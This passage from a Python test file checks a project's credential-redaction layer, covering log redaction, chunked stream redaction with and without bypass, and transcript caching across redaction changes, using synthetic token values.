        from kiro_crew.platform.context import redact_log_via_context

        _seams(True, monkeypatch)
        token = _github_token()
        with redaction_seams.output_seam(redaction_seams.CHANNELS):
            assert token not in redact_log_via_context(f"slot {token}")


class TestBypassedStream:
    def test_a_long_credential_shaped_value_is_not_altered_with_redaction_off(self, monkeypatch):
        _seams(True, monkeypatch)
        value = "Authorization: Bearer " + "A1b2C3d4" * 700
        redactor = security.StreamRedactor()
        with redaction_seams.output_seam(redaction_seams.CHANNELS):
            out = "".join(redactor.feed(value[i : i + 128]) for i in range(0, len(value), 128))
            out += redactor.flush()
        assert out == value

    def test_an_address_split_across_chunks_is_left_as_written(self, monkeypatch):
        _seams(True, monkeypatch)
        url = _synth_exfil_url()
        redactor = security.StreamRedactor()
        with redaction_seams.output_seam(redaction_seams.CHAT):
            half = len(url) // 2
            out = redactor.feed("see " + url[:half]) + redactor.feed(url[half:] + " end")
            out += redactor.flush()
        assert out == f"see {url} end"

    def test_a_transcript_build_that_spans_a_change_is_not_cached(self, monkeypatch):
        from kiro_crew.dashboard import chat_persistence

        _seams(False, monkeypatch)
        row = {
            "role": "assistant",
            "content": "plain " + _github_token(),
            "ts": "2026-11-14T00:00:09+00:00",
        }
        real = chat_persistence._build_message_entry_uncached

        def flipping(m, **kw):
            redaction_seams.publish(True)
            return real(m, **kw)

        monkeypatch.setattr(chat_persistence, "_build_message_entry_uncached", flipping)
        chat_persistence._build_message_entry(dict(row))
        monkeypatch.setattr(chat_persistence, "_build_message_entry_uncached", real)
        redaction_seams.publish(False)
        fresh = chat_persistence._build_message_entry(dict(row))
        assert fresh is not None and _github_token() not in fresh["content"]
